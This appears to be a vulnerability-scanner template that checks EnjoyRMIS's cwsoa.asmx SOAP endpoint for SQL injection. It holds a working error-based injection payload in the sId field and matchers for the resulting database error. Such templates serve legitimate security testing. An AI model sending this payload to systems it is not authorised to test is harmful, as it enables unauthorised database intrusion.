folder-5/poc-yaml-enjoyrmis-cwsoa-asmx-sqli.yaml

id: enjoyrmis-cwsoa-asmx-sqli
info:
  name: EnjoyRMIS cwsoa.asmx SQL Injection
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
http:
  - method: POST
    path:
      - "{{BaseURL}}/EnjoyRMIS_WS/WS/POS/cwsoa.asmx"
    headers:
      Content-Type: text/xml; charset=utf-8
      SOAPAction: "http://tempuri.org/GetOAById"
    body: |-
      <?xml version="1.0" encoding="utf-8"?>
      <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
      <soap:Body>
      <GetOAById xmlns="http://tempuri.org/">
      <sId>string' AND 8448 IN (SELECT (CHAR(113)+CHAR(113)+CHAR(113)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (8448=8448) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(107)+CHAR(113)+CHAR(113))) AND 'OFyo'='OFyo</sId>
      </GetOAById>
      </soap:Body>
      </soap:Envelope>
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 500
      - type: word
        part: body
        words:
          - "qqqzq1qvkqq"
          - "在将 varchar 值"
          - "转换成数据类型 int 时失败"
      - type: word
        part: header
        words:
          - "text/xml"
